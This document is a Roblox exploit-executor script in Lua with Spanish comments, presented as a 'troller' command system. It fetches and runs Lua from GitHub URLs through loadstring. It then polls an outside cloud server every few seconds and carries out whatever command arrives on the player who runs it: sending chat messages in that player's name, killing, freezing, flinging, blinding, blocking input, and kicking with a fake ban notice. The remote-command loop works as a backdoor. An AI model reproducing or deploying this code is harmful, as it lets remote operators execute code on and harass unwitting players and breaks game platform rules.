--[[
    Troller Commands Script (MODO NUBE - Delta / Xeno)
    Sistema distribuido por la nube de Bot-Hosting manteniendo la jerarquía original.
]]

-- ================== GUARD ==================
if _G.__TrollerRunning then
    warn("[Troller] El script ya está en ejecución. Abortando duplicado.")
    return
end
_G.__TrollerRunning = true

local Players           = game:GetService("Players")
local HttpService       = game:GetService("HttpService")
local TextChatService   = game:GetService("TextChatService")
local Debris            = game:GetService("Debris")
local TeleportService   = game:GetService("TeleportService")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui           = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PREFIX = "."
local NO_TARGET = "@@NONE@@"

-- Tu URL de Bot-Hosting
local SERVER_URL = "https://sbxx2o7cud.apps.bot-hosting.cloud"

-- ================== CONFIG ==================
local MASTERS_URL = "https://raw.githubusercontent.com/brsfjgh/prove/refs/heads/main/master.lua"
local ADMINS_URL  = "https://raw.githubusercontent.com/brsfjgh/prove/refs/heads/main/admin.lua"

local function loadListFromUrl(url)
    local ok, result = pcall(function()
        local source = game:HttpGet(url)
        local chunk = loadstring(source)
        if not chunk then error("No se pudo cargar el chunk") end
        return chunk()
    end)

    if not ok or type(result) ~= "table" then
        warn("[Troller] No se pudo cargar la lista desde: " .. url)
        return {}
    end

    return result
end

local MASTERS = loadListFromUrl(MASTERS_URL)
local ADMINS  = loadListFromUrl(ADMINS_URL)

print("[Troller] Masters cargados: " .. #MASTERS)
print("[Troller] Admins cargados: "  .. #ADMINS)
-- ============================================

local selfFrozen  = false
local selfBlinded = false
local selfBlocked = false

_G.TrollerSelfBlocked = false

local UNDO_COMMANDS = {
    unfr    = true,
    unblind = true,
    unblock = true,
}

local UNDO_REQUIRES_NICK = {
    unfr    = true,
    unblind = true,
    unblock = true,
}

local STRICT_LOWER_COMMANDS = {
    kick = true,
    ban  = true,
}

local TEXT_COMMANDS = {
    say = true,
}

-- ================== NIVELES ==================

local function getLevel(plr)
    if not plr then return 1 end

    for _, m in ipairs(MASTERS) do
        if type(m) == "number" and plr.UserId == m then return 3 end
        if type(m) == "string" then
            local ml = m:lower()
            if plr.Name:lower() == ml or plr.DisplayName:lower() == ml then
                return 3
            end
        end
    end

    for _, a in ipairs(ADMINS) do
        if type(a) == "number" and plr.UserId == a then return 2 end
        if type(a) == "string" then
            local al = a:lower()
            if plr.Name:lower() == al or plr.DisplayName:lower() == al then
                return 2
            end
        end
    end

    return 1
end

-- ================== HELPERS ==================

local function getPlayersByName(name)
    local lower = name:lower()
    local exact = {}
    local prefix = {}

    for _, p in ipairs(Players:GetPlayers()) do
        local pn = p.Name:lower()
        local dn = p.DisplayName:lower()

        if pn == lower or dn == lower then
            table.insert(exact, p)
        elseif pn:sub(1, #lower) == lower or dn:sub(1, #lower) == lower then
            table.insert(prefix, p)
        end
    end

    if #exact > 0 then return exact end
    return prefix
end

local function splitArgs(msg)
    local args = {}
    for word in msg:gmatch("%S+") do
        table.insert(args, word)
    end
    return args
end

local function parseTargetForCmd(args, cmdName)
    if not args[2] then return nil, 2 end

    local second = args[2]

    if second:sub(-1) == "." and #second > 1 then
        local name = second:sub(1, -2)
        if #getPlayersByName(name) > 0 then
            return name, 3
        end
        return NO_TARGET, 2
    end

    if TEXT_COMMANDS[cmdName] then
        return nil, 2
    end

    if #getPlayersByName(second) > 0 then
        return second, 3
    end

    return NO_TARGET, 2
end

local function getLocalHumanoid()
    local char = LocalPlayer.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end

local function getLocalHRP()
    local char = LocalPlayer.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end

-- ================== ACCIONES LOCALES ==================

local function freezeSelf()
    selfFrozen = true
    local hum = getLocalHumanoid()
    if hum then
        hum.WalkSpeed      = 0
        hum.JumpPower      = 0
        hum.JumpHeight     = 0
        hum.PlatformStand = true
    end
end

local function unfreezeSelf()
    selfFrozen = false
    local hum = getLocalHumanoid()
    if hum then
        hum.WalkSpeed      = 16
        hum.JumpPower      = 50
        hum.JumpHeight     = 7.2
        hum.PlatformStand = false
    end
end

local function killSelf()
    local hum = getLocalHumanoid()
    if hum then hum.Health = 0 end
end

local function flingSelf()
    pcall(function()
        local remote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("RagdollState")
        local args = {
            Vector3.new(541.3642578125, 1002.5345458984375, -802.6290893554688),
            5,
        }
        for i = 1, 2 do
            firesignal(remote.OnClientEvent, table.unpack(args))
            task.wait(0.05)
        end
    end)
end

local function flingSelf2()
    local hrp = getLocalHRP()
    if not hrp then return end

    hrp.CFrame = hrp.CFrame + Vector3.new(0, 7.5, 0)

    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bv.Velocity = Vector3.new(math.random(-50, 50), math.random(150, 225), math.random(-50, 50))
    bv.Parent = hrp
    Debris:AddItem(bv, 0.125)

    local bav = Instance.new("BodyAngularVelocity")
    bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
    bav.AngularVelocity = Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5))
    bav.Parent = hrp
    Debris:AddItem(bav, 0.125)
end

local function blindSelf()
    if selfBlinded then return end
    selfBlinded = true

    local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not guiParent then return end

    local blackScreenGui = Instance.new("ScreenGui")
    blackScreenGui.Name = "TrollerBlind"
    blackScreenGui.IgnoreGuiInset = true
    blackScreenGui.ResetOnSpawn = false
    blackScreenGui.DisplayOrder = 999

    local blackFrame = Instance.new("Frame")
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.Parent = blackScreenGui

    blackScreenGui.Parent = guiParent
    pcall(function() UserInputService.ModalEnabled = true end)
end

local function unblindSelf()
    selfBlinded = false
    pcall(function() UserInputService.ModalEnabled = false end)
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui")}) do
        if parent then
            local leftover = parent:FindFirstChild("TrollerBlind")
            if leftover then leftover:Destroy() end
        end
    end
end

local function blockSelf()
    if selfBlocked then return end
    selfBlocked = true
    _G.TrollerSelfBlocked = true

    local guiParent = CoreGui or LocalPlayer:FindFirstChildOfClass("PlayerGui")
    if not guiParent then return end

    local blockGui = Instance.new("ScreenGui")
    blockGui.Name = "TrollerBlock"
    blockGui.IgnoreGuiInset = true
    blockGui.ResetOnSpawn = false
    blockGui.DisplayOrder = 999

    local blockFrame = Instance.new("Frame")
    blockFrame.Size = UDim2.new(1, 0, 1, 0)
    blockFrame.BackgroundTransparency = 1
    blockFrame.Active = true
    blockFrame.Parent = blockGui

    blockGui.Parent = guiParent
    pcall(function() UserInputService.ModalEnabled = true end)
end

local function unblockSelf()
    selfBlocked = false
    _G.TrollerSelfBlocked = false
    pcall(function() UserInputService.ModalEnabled = false end)
    for _, parent in ipairs({CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui")}) do
        if parent then
            local leftover = parent:FindFirstChild("TrollerBlock")
            if leftover then leftover:Destroy() end
        end
    end
end

local function bringSelfTo(targetPlayer)
    local myHRP = getLocalHRP()
    if not myHRP or not targetPlayer then return end
    local targetChar = targetPlayer.Character
    local targetHRP  = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
    if targetHRP then
        myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -3)
    end
end

local function teleportSelfTo(targetPlayer)
    local myHRP = getLocalHRP()
    if not myHRP or not targetPlayer then return end
    local targetChar = targetPlayer.Character
    local targetHRP  = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
    if targetHRP then
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(0, 0, 3)
    end
end

local function rejoinSelf()
    pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
    end)
end

-- ================== APLICAR COMANDO LOCALMENTE ==================

local function applyCommandLocally(cmdName, senderPlr, text)
    if cmdName == "say" then
        if text and text ~= "" then
            pcall(function()
                TextChatService.TextChannels.RBXGeneral:SendAsync(text)
            end)
        end
    elseif cmdName == "kill"    then killSelf()
    elseif cmdName == "fr"      then freezeSelf()
    elseif cmdName == "unfr"    then unfreezeSelf()
    elseif cmdName == "fling"   then flingSelf()
    elseif cmdName == "fling2"  then flingSelf2()
    elseif cmdName == "blind"   then blindSelf()
    elseif cmdName == "unblind" then unblindSelf()
    elseif cmdName == "b"       then bringSelfTo(senderPlr)
    elseif cmdName == "block"   then blockSelf()
    elseif cmdName == "unblock" then unblockSelf()
    elseif cmdName == "rj"      then rejoinSelf()
    elseif cmdName == "kick"    then pcall(function() LocalPlayer:Kick("Has sido expulsado del servidor.") end)
    elseif cmdName == "ban"     then pcall(function() LocalPlayer:Kick("Has sido BANEADO de este servidor.\nRazón: Exploiting") end)
    end
end

-- ================== PROCESADOR DE COMANDOS DESDE LA NUBE ==================

local function processCloudCommand(message)
    if not message or message == "" then return end
    if message:sub(1, #PREFIX) ~= PREFIX then return end

    local body = message:sub(#PREFIX + 1)
    local args = splitArgs(body)
    if #args == 0 then return end

    local cmdName = args[1]:lower()
    local targetName, restStart = parseTargetForCmd(args, cmdName)

    if targetName == NO_TARGET then return end
    if UNDO_REQUIRES_NICK[cmdName] and not targetName then return end

    local text = ""
    if #args >= restStart then
        text = table.concat(args, " ", restStart)
    end

    local iAmTarget = false
    if not targetName then
        iAmTarget = true
    else
        for _, p in ipairs(getPlayersByName(targetName)) do
            if p == LocalPlayer then
                iAmTarget = true
                break
            end
        end
    end
    if not iAmTarget then return end

    -- Como el comando viene validado desde el panel Master/Admin en la nube, se ejecuta localmente
    applyCommandLocally(cmdName, nil, text)
end

-- ================== POLLING CONSTANTE DE LA NUBE ==================

local lastFetchedCommand = ""

task.spawn(function()
    while true do
        local success, response = pcall(function()
            return game:HttpGet(SERVER_URL .. "/api/get-command")
        end)

        if success then
            local suc, data = pcall(function()
                return HttpService:JSONDecode(response)
            end)
            if suc and data and data.command then
                if data.command ~= "" and data.command ~= lastFetchedCommand then
                    lastFetchedCommand = data.command
                    processCloudCommand(data.command)
                elseif data.command == "" then
                    lastFetchedCommand = ""
                end
            end
        end

        task.wait(2.5) -- Consulta la nube cada 2.5 segundos
    end
end)

-- ================== REAPLICAR AL RESPAWNEAR ==================

LocalPlayer.CharacterAdded:Connect(function()
    if selfFrozen then
        task.wait(0.25)
        freezeSelf()
    end
    if selfBlinded then
        task.wait(0.6)
        blindSelf()
    end
    if selfBlocked then
        task.wait(0.6)
        blockSelf()
    end
end)

print("[Troller Cloud] Sistema distribuido por nube iniciado correctamente.")
